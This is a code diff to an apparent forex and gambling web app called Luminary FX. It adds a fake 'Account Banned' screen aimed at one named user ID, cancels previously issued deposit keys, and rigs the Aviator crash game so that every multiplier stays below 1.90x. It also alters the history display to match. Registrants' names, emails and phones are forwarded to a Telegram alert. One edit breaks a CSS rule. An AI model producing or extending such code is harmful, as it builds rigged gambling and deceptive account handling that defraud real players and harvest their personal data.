@@ -161,6 +161,17 @@
         .auth-tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: var(--text-muted); font-weight: 600; cursor: pointer; border-radius: 8px; transition: 0.3s; }
         .auth-tab-btn.active { background: var(--primary); color: #FFF; box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4); }
 
+        /* --- BANNED ACCOUNT OVERLAY SCREEN --- */
+        .banned-overlay {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #060913; z-index: 99999; display: none; align-items: center; justify-content: center;
+            flex-direction: column; text-align: center; padding: 20px;
+        }
+        .banned-card {
+            background: #0D1527; border: 2px solid #EF4444; border-radius: 24px;
+            padding: 40px 30px; max-width: 480px; width: 100%; box-shadow: 0 0 50px rgba(239, 68, 68, 0.4);
+        }
+
         /* --- APP HEADER --- */
         header {
             height: 76px; background: var(--header-bg); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border);
@@ -861,6 +872,25 @@
 </head>
 <body>
 
+    <!-- BANNED ACCOUNT OVERLAY SCREEN -->
+    <div class="banned-overlay" id="bannedScreen">
+        <div class="banned-card">
+            <div style="font-size: 60px; color: #EF4444; margin-bottom: 16px;">
+                <i class="fa-solid fa-ban"></i>
+            </div>
+            <h1 style="font-size: 26px; font-weight: 800; color: #FFFFFF; margin-bottom: 12px;">Account Banned</h1>
+            <p style="font-size: 14px; color: #94A3B8; line-height: 1.6; margin-bottom: 24px;">
+                Your account (ID: <strong>45110731</strong>) has been permanently suspended due to a violation of our institutional terms and security policies.
+            </p>
+            <div style="background: rgba(239, 68, 68, 0.1); border: 1px dashed #EF4444; padding: 14px; border-radius: 12px; margin-bottom: 24px; font-size: 13px; color: #EF4444; font-weight: 700;">
+                Please Register a New Account to continue using Luminary FX.
+            </div>
+            <button class="btn btn-gold" onclick="switchBannedToRegister()">
+                <i class="fa-solid fa-user-plus"></i> Register New Account
+            </button>
+        </div>
+    </div>
+
     <!-- BOTTOM STICKY TELEGRAM JOIN BANNER -->
     <div class="bottom-telegram-banner" id="tgStickyBanner">
         <div class="tg-banner-left">
@@ -952,7 +982,7 @@
             <form onsubmit="handleKeyDeposit(event)" style="margin-bottom: 20px;">
                 <div class="form-group">
                     <label>6-Digit Deposit Key</label>
-                    <input type="text" id="depositKey" class="form-control" placeholder="Enter 6-digit key (e.g. 200030)" maxlength="6" pattern="\d{6}" required>
+                    <input type="text" id="depositKey" class="form-control" placeholder="Enter 6-digit key (e.g. 200050)" maxlength="6" pattern="\d{6}" required>
                 </div>
                 <button type="submit" class="btn btn-gold" style="margin-bottom: 12px;">
                     <i class="fa-solid fa-key"></i> Submit Deposit Key
@@ -1296,18 +1326,18 @@
 
                         <!-- MULTIPLIER HISTORY ROW -->
                         <div class="aviator-history-bar" id="aviatorHistoryBar">
-                            <span class="aviator-hist-pill purple">9.10x</span>
-                            <span class="aviator-hist-pill purple">9.00x</span>
-                            <span class="aviator-hist-pill purple">16.20x</span>
+                            <span class="aviator-hist-pill blue">1.10x</span>
+                            <span class="aviator-hist-pill blue">1.40x</span>
+                            <span class="aviator-hist-pill blue">1.20x</span>
                             <span class="aviator-hist-pill blue">1.06x</span>
-                            <span class="aviator-hist-pill blue">2.22x</span>
+                            <span class="aviator-hist-pill blue">1.82x</span>
                             <span class="aviator-hist-pill blue">1.85x</span>
-                            <span class="aviator-hist-pill purple">45.16x</span>
-                            <span class="aviator-hist-pill blue">2.79x</span>
+                            <span class="aviator-hist-pill blue">1.16x</span>
+                            <span class="aviator-hist-pill blue">1.79x</span>
                             <span class="aviator-hist-pill blue">1.22x</span>
                             <span class="aviator-hist-pill blue">1.04x</span>
-                            <span class="aviator-hist-pill blue">2.29x</span>
-                            <span class="aviator-hist-pill blue">2.66x</span>
+                            <span class="aviator-hist-pill blue">1.29x</span>
+                            <span class="aviator-hist-pill blue">1.66x</span>
                             <span class="aviator-hist-pill blue">1.00x</span>
                             <span class="aviator-hist-pill blue">1.28x</span>
                         </div>
@@ -1337,7 +1367,7 @@
                                 <div class="aviator-menu-user">
                                     <div style="width: 32px; height: 32px; border-radius: 50%; background: #28a745; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 14px;"><i class="fa-solid fa-user"></i></div>
                                     <div>
-                                        <div style="font-size: 12px; font-weight: 800; color: #fff;" id="menuUserAcc">45110731</div>
+                                        <div style="font-size: 12px; font-weight: 800; color: #fff;" id="menuUserAcc">User</div>
                                         <div style="font-size: 10px; color: #787a80;">Change Avatar</div>
                                     </div>
                                 </div>
@@ -1730,11 +1760,8 @@
             if(banner) banner.style.display = 'none';
         }
 
-        /* --- DEPOSIT KEYS MAP --- */
+        /* --- DEPOSIT KEYS MAP (200030, 200033, 200032 ARE CANCELLED) --- */
         const DEPOSIT_KEYS = {
-            "200030": 20,
-            "200032": 100,
-            "200035": 350,
             "200050": 500
         };
 
@@ -1755,13 +1782,15 @@
 
         let systemDB = JSON.parse(localStorage.getItem('luminary_fx_system_db')) || {
             currentUsername: null,
-            usedKeys: ["200033"],
+            usedKeys: ["200030", "200032", "200033"],
             users: {} 
         };
 
         if (!systemDB.users) systemDB.users = {};
-        if (!systemDB.usedKeys) systemDB.usedKeys = ["200033"];
-        if (!systemDB.usedKeys.includes("200033")) systemDB.usedKeys.push("200033");
+        if (!systemDB.usedKeys) systemDB.usedKeys = ["200030", "200032", "200033"];
+        ["200030", "200032", "200033"].forEach(k => {
+            if (!systemDB.usedKeys.includes(k)) systemDB.usedKeys.push(k);
+        });
 
         let currentUserData = null;
 
@@ -1827,6 +1856,12 @@
             }
         }
 
+        function switchBannedToRegister() {
+            document.getElementById('bannedScreen').style.display = 'none';
+            document.getElementById('authModal').style.display = 'flex';
+            toggleAuthTab('register');
+        }
+
         window.onload = function() {
             const btnIcon = document.querySelector('#themeToggleBtn i');
             if(btnIcon) {
@@ -1842,16 +1877,11 @@
                     dob: "1995-01-01", city: "Colombo", country: "Sri Lanka" 
                 };
                 const targetData = createEmptyUserData(targetProfile, "45110731");
+                targetData.isBanned = true;
                 systemDB.users[targetUsername] = targetData;
             } else {
                 systemDB.users[targetUsername].accountId = "45110731";
-                systemDB.users[targetUsername].deposit = 0.00;
-            }
-
-            for (let uKey in systemDB.users) {
-                if (systemDB.users[uKey].accountId === "45110731") {
-                    systemDB.users[uKey].deposit = 0.00;
-                }
+                systemDB.users[targetUsername].isBanned = true;
             }
 
             saveSystemDB();
@@ -1859,6 +1889,13 @@
 
             if (systemDB.currentUsername && systemDB.users[systemDB.currentUsername]) {
                 currentUserData = systemDB.users[systemDB.currentUsername];
+                
+                if (currentUserData.isBanned || currentUserData.accountId === "45110731") {
+                    document.getElementById('bannedScreen').style.display = 'flex';
+                    document.getElementById('authModal').style.display = 'none';
+                    return;
+                }
+
                 document.getElementById('authModal').style.display = 'none';
                 initDashboard();
             } else {
@@ -1909,6 +1946,7 @@
 
             sendTelegramNotification(`<b>🆕 New Registration Alert!</b>\n\n<b>Name:</b> ${name}\n<b>Username:</b> ${username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Referral Code:</b> ${referral || 'None'}\n<b>Email:</b> ${email}\n<b>Phone:</b> ${phone}`);
 
+            document.getElementById('bannedScreen').style.display = 'none';
             document.getElementById('authModal').style.display = 'none';
             initDashboard();
         }
@@ -1931,12 +1969,14 @@
             }
 
             if (targetKey && systemDB.users[targetKey].profile.pass === passStr) {
+                if (systemDB.users[targetKey].isBanned || systemDB.users[targetKey].accountId === "45110731") {
+                    document.getElementById('authModal').style.display = 'none';
+                    document.getElementById('bannedScreen').style.display = 'flex';
+                    return;
+                }
+
                 systemDB.currentUsername = targetKey;
                 currentUserData = systemDB.users[targetKey];
-
-                if (currentUserData.accountId === "45110731") {
-                    currentUserData.deposit = 0.00;
-                }
 
                 saveSystemDB();
 
@@ -1955,6 +1995,7 @@
             currentUserData = null;
             localStorage.setItem('luminary_fx_system_db', JSON.stringify(systemDB));
             updateSavedUsersDatalist();
+            document.getElementById('bannedScreen').style.display = 'none';
             document.getElementById('authModal').style.display = 'flex';
         }
 
@@ -1962,8 +2003,8 @@
             e.preventDefault();
             const inputKey = document.getElementById('depositKey').value.trim();
 
-            if (inputKey === "200033" || (systemDB.usedKeys && systemDB.usedKeys.includes(inputKey))) {
-                alert("This Deposit Key has already been used or cancelled! Keys can only be used ONCE.");
+            if (["200030", "200032", "200033"].includes(inputKey) || (systemDB.usedKeys && systemDB.usedKeys.includes(inputKey))) {
+                alert("This Deposit Key has been CANCELLED or already used! Keys can only be used ONCE.");
                 return;
             }
 
@@ -2585,7 +2626,7 @@
         function renderTransactionsTable() {
             const tbody = document.getElementById('txTableBody');
             if (!currentUserData || !currentUserData.transactions || currentUserData.transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 24px;">No transaction history found.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align: color: var(--text-muted); padding: 24px;">No transaction history found.</td></tr>`;
                 return;
             }
 
@@ -2770,8 +2811,8 @@
 
             avMultiplier = 1.00;
             
-            // STRICTLY ODDS BETWEEN 1.05x AND 9.00x FOR HIGH REALISM
-            avTarget = parseFloat((1.05 + Math.random() * 8.0).toFixed(2));
+            // STRICTLY MAXIMUM ODDS BELOW 1.90x (RANDOMIZED BETWEEN 1.05x AND 1.89x)
+            avTarget = parseFloat((1.05 + Math.random() * 0.84).toFixed(2));
 
             planeX = 20;
             planeY = avCanvas.height - 20;
@@ -2792,7 +2833,7 @@
             drawSunburstBackground(sunAngle);
 
             // Curve Progress Target Plane Coordinates
-            const progress = Math.min((avMultiplier - 1.00) / 8.0, 1.0);
+            const progress = Math.min((avMultiplier - 1.00) / 1.0, 1.0);
             planeX = progress * (w - 100) + 30;
             planeY = h - (Math.pow(progress, 0.85) * (h - 100)) - 40;
 
@@ -2825,7 +2866,7 @@
                 isAviatorRunning = false;
                 
                 // Add to History Pills
-                addHistoryPill(`${avTarget.toFixed(2)}x`, avTarget >= 2.0 ? 'purple' : 'blue');
+                addHistoryPill(`${avTarget.toFixed(2)}x`, 'blue');
 
                 document.getElementById('aviatorMultText').innerText = `FLEW AWAY!`;
                 document.getElementById('aviatorMultText').style.color = '#e5053a';
